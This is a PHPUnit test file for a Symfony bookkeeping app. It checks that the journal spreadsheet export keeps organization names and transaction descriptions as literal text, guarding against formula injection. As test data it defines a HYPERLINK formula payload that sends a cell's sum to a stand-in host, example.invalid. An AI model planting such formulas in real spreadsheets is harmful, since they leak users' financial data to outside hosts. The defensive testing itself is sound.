<?php

namespace App\Tests\Transaction;

use App\Controller\Transaction\TransactionController;
use App\Entity\Konto\Konto;
use App\Entity\Organization\CreateOrganizationCommand;
use App\Entity\Organization\Organization;
use App\Entity\Organization\UpdateOrganizationCommand;
use App\Entity\Transaction\CreateTransactionCommand;
use App\Entity\Transaction\Transaction;
use App\Entity\Transaction\UpdateTransactionCommand;
use App\Entity\User\User;
use App\Form\Organization\OrganizationType;
use App\Form\Transaction\TransactionType;
use App\Repository\Transaction\TransactionRepository;
use Doctrine\Common\Collections\ArrayCollection;
use Doctrine\ORM\EntityManagerInterface;
use Doctrine\ORM\Query;
use Doctrine\ORM\QueryBuilder;
use Knp\Component\Pager\PaginatorInterface;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;
use PHPUnit\Framework\MockObject\MockObject;
use Psr\Log\NullLogger;
use ReflectionClass;
use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;
use Symfony\Component\Form\FormFactoryInterface;
use Symfony\Component\Form\FormInterface;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Session\Session;
use Symfony\Component\HttpFoundation\Session\Storage\MockArraySessionStorage;
use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken;
use ZipArchive;

/**
 * Journal export must keep company names and descriptions as text.
 *
 * These tests fail while TransactionController::export() passes those strings
 * through Worksheet::setCellValue(), which PhpSpreadsheet 1.30 stores as
 * formulas when the text is longer than one character and starts with "=".
 */
class JournalSpreadsheetFormulaInjectionTest extends KernelTestCase
{
    private const NAME_FORMULA = '="forged-company"';

    private const LINK_FORMULA = '=HYPERLINK("https://example.invalid/journal?sum="&C2,"forged-link")';

    private FormFactoryInterface $forms;

    private User $user;

    protected function setUp(): void
    {
        self::bootKernel();
        $request = Request::create('/dashboard/organization/new', 'POST');
        $request->setSession(new Session(new MockArraySessionStorage()));
        self::getContainer()->get('request_stack')->push($request);
        $this->forms = self::getContainer()->get('form.factory');
        $this->user = $this->user();
    }

    public function testCompanyNameWithoutShortNameIsExportedAsLiteralText(): void
    {
        $command = $this->submitOrganization([
            'name' => self::NAME_FORMULA,
            'shortName' => '',
            'taxNumber' => '12345678',
        ]);
        $this->assertSame(self::NAME_FORMULA, $command->name);

        $organization = $this->user->createOrganization($command);
        $this->assertSame(self::NAME_FORMULA, $organization->getShortName());

        $exported = $this->export($this->transaction($organization, 'office rent', 42));

        $this->assertCellIsLiteralText($exported, 'A2', self::NAME_FORMULA);
    }

    public function testStoredShortNameIsExportedAsLiteralText(): void
    {
        $command = $this->submitOrganization([
            'name' => 'Safe Co',
            'shortName' => self::LINK_FORMULA,
            'taxNumber' => '12345678',
        ]);
        $this->assertSame(self::LINK_FORMULA, $command->shortName);

        $organization = $this->user->createOrganization($command);
        $exported = $this->export($this->transaction($organization, 'office rent', 42));

        $this->assertCellIsLiteralText($exported, 'A2', self::LINK_FORMULA);
        $this->assertStringNotContainsString('example.invalid', $exported['rels']);
    }

    public function testJournalDescriptionIsExportedAsLiteralText(): void
    {
        $description = $this->submitDescription(self::LINK_FORMULA);
        $this->assertSame(self::LINK_FORMULA, $description);

        $organization = $this->organization('Safe Co', 'Safe');
        $exported = $this->export($this->transaction($organization, $description, 42));

        $this->assertCellIsLiteralText($exported, 'F2', self::LINK_FORMULA);
        $this->assertStringNotContainsString('example.invalid', $exported['rels']);
    }

    public function testUpdatedShortNameIsExportedAsLiteralText(): void
    {
        $organization = $this->organization('Safe Co', 'Safe');
        $command = new UpdateOrganizationCommand();
        $submitted = $this->submitOrganization([
            'name' => 'Safe Co',
            'shortName' => self::LINK_FORMULA,
            'taxNumber' => '12345678',
        ], $command);
        $this->assertSame(self::LINK_FORMULA, $submitted->shortName);

        $organization->update($submitted, $this->user);
        $exported = $this->export($this->transaction($organization, 'office rent', 42));

        $this->assertCellIsLiteralText($exported, 'A2', self::LINK_FORMULA);
        $this->assertStringNotContainsString('example.invalid', $exported['rels']);
    }

    public function testUpdatedJournalDescriptionIsExportedAsLiteralText(): void
    {
        $organization = $this->organization('Safe Co', 'Safe');
        $transaction = $this->transaction($organization, 'office rent', 42);
        $command = new UpdateTransactionCommand();
        $submittedDescription = $this->submitDescription(self::LINK_FORMULA, $command);
        $this->assertSame(self::LINK_FORMULA, $submittedDescription);

        $command->description = $submittedDescription;
        $transaction->update($command, $this->user, null, new NullLogger());
        $exported = $this->export($transaction);

        $this->assertCellIsLiteralText($exported, 'F2', self::LINK_FORMULA);
        $this->assertStringNotContainsString('example.invalid', $exported['rels']);
    }

    public function testDescriptionWithInvoiceSuffixIsExportedAsLiteralText(): void
    {
        $organization = $this->organization('Safe Co', 'Safe');
        $transaction = $this->transaction($organization, self::LINK_FORMULA, 42);
        $invoice = (new ReflectionClass(\App\Entity\Invoice\Invoice::class))->newInstanceWithoutConstructor();
        (new ReflectionClass(\App\Entity\Invoice\Invoice::class))->getProperty('number')->setValue($invoice, '9');
        (new ReflectionClass($transaction))->getProperty('invoice')->setValue($transaction, $invoice);

        $exported = $this->export($transaction);

        $this->assertCellIsLiteralText($exported, 'F2', $transaction->getDescription());
    }

    public function testOrdinaryJournalTextStaysUnchanged(): void
    {
        $organization = $this->organization('Acme d.o.o.', 'Acme');
        $exported = $this->export($this->transaction($organization, 'office rent', 42));

        $this->assertCellIsLiteralText($exported, 'A2', 'Acme');
        $this->assertCellIsLiteralText($exported, 'F2', 'office rent');
    }

    private function submitOrganization(array $fields, ?CreateOrganizationCommand $command = null): CreateOrganizationCommand
    {
        $command ??= new CreateOrganizationCommand();
        $form = $this->forms->create(OrganizationType::class, $command);
        $form->submit($fields + ['_token' => $this->csrfToken($form)]);
        $this->assertTrue($form->isValid(), (string) $form->getErrors(true, false));

        return $command;
    }

    private function submitDescription(string $description, ?CreateTransactionCommand $command = null): string
    {
        $command ??= new CreateTransactionCommand();
        $form = $this->forms->create(TransactionType::class, $command, [
            'organizations' => [],
            'allow_hidden' => false,
        ]);
        // Submit only the textarea. The organization and konto fields are entity
        // choices and are not part of the text that reaches the description column.
        $field = $form->get('description');
        $field->submit($description);
        $this->assertTrue($field->isValid(), (string) $field->getErrors(true, false));
        $this->assertSame($description, $field->getData());
        // Same write-back the form data mapper performs for a submitted mapped field.
        $form->getConfig()->getDataMapper()->mapFormsToData(new \ArrayIterator([$field]), $command);
        $this->assertSame($description, $command->description);

        return $command->description;
    }

    private function csrfToken(FormInterface $form): string
    {
        return (string) $form->createView()['_token']->vars['value'];
    }

    private function organization(string $name, ?string $shortName): Organization
    {
        $command = new CreateOrganizationCommand();
        $command->code = 'ORG1';
        $command->name = $name;
        $command->shortName = $shortName;
        $command->taxNumber = '12345678';
        $command->taxable = false;

        return $this->user->createOrganization($command);
    }

    private function transaction(Organization $organization, string $description, int $sum): Transaction
    {
        $command = new CreateTransactionCommand();
        $command->organization = $organization;
        $command->date = new \DateTimeImmutable('2024-01-15 00:00:00');
        $command->sum = $sum;
        $command->creditKonto = $this->konto(760);
        $command->debitKonto = $this->konto(120);
        $command->description = $description;
        $command->hidden = false;

        return $this->user->createTransactionWithDescription($command);
    }

    private function konto(int $number): Konto
    {
        $konto = (new ReflectionClass(Konto::class))->newInstanceWithoutConstructor();
        $property = (new ReflectionClass(Konto::class))->getParentClass()->getProperty('number');
        $property->setValue($konto, $number);

        return $konto;
    }

    private function user(): User
    {
        $user = (new ReflectionClass(User::class))->newInstanceWithoutConstructor();
        $this->setProperty($user, 'firstName', 'Ada');
        $this->setProperty($user, 'lastName', 'Lovelace');
        $this->setProperty($user, 'username', 'ada-export');
        $this->setProperty($user, 'roles', ['ROLE_USER']);
        $this->setProperty($user, 'organizations', new ArrayCollection());

        return $user;
    }

    private function setProperty(object $object, string $name, mixed $value): void
    {
        $class = new ReflectionClass($object);
        while (!$class->hasProperty($name)) {
            $class = $class->getParentClass();
        }
        $property = $class->getProperty($name);
        $property->setValue($object, $value);
    }

    /**
     * @return array{sheet: Worksheet, path: string, xml: string, rels: string}
     */
    private function export(Transaction $transaction): array
    {
        $query = $this->createMock(Query::class);
        $query->method('getResult')->willReturn([$transaction]);

        $queryBuilder = $this->getMockBuilder(QueryBuilder::class)
            ->setConstructorArgs([$this->createMock(EntityManagerInterface::class)])
            ->onlyMethods(['getQuery'])
            ->getMock();
        $queryBuilder->method('getQuery')->willReturn($query);

        /** @var TransactionRepository&MockObject $transactions */
        $transactions = $this->createMock(TransactionRepository::class);
        $transactions->method('getFilteredQuery')->willReturn($queryBuilder);

        $controller = new TransactionController();
        $controller->setContainer(static::getContainer());
        static::getContainer()->get('security.token_storage')->setToken(
            new UsernamePasswordToken($this->user, 'main', $this->user->getRoles()),
        );

        $response = $controller->export(
            $transactions,
            Request::create('/dashboard/transaction/export', 'GET', [
                'dateFrom' => '1700000000',
                'dateTo' => '1700086400',
            ]),
            $this->createMock(PaginatorInterface::class),
        );

        $path = $response->getFile()->getPathname();
        $sheet = IOFactory::load($path)->getActiveSheet();
        $zip = new ZipArchive();
        $zip->open($path);
        $xml = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
        $rels = (string) $zip->getFromName('xl/worksheets/_rels/sheet1.xml.rels');
        $zip->close();

        return ['sheet' => $sheet, 'path' => $path, 'xml' => $xml, 'rels' => $rels];
    }

    /**
     * @param array{sheet: Worksheet, path: string, xml: string, rels: string} $exported
     */
    private function assertCellIsLiteralText(array $exported, string $coordinate, string $literal): void
    {
        $cell = $exported['sheet']->getCell($coordinate);
        $hyperlink = $cell->getHyperlink()->getUrl();
        try {
            $calculated = (string) $cell->getCalculatedValue();
        } catch (\Throwable $e) {
            $calculated = $e::class.': '.$e->getMessage();
        }
        $this->assertSame(
            DataType::TYPE_STRING,
            $cell->getDataType(),
            $coordinate.' was stored as data type '.$cell->getDataType()
            .' with value ['.$cell->getValue().']'
            .' calculated ['.$calculated.']'
            .' hyperlink ['.$hyperlink.']'
            .' formula element '.(str_contains($exported['xml'], '<f>') ? 'yes' : 'no')
            .' external link '.(str_contains($exported['rels'], 'example.invalid') ? 'yes' : 'no')
        );
        $this->assertSame($literal, $cell->getValue());
        $this->assertSame('', $hyperlink);
        $this->assertStringNotContainsString('<f>', $exported['xml']);
        $this->assertStringNotContainsString('example.invalid', $exported['rels']);
        $this->assertSame($literal, $calculated);
    }
}
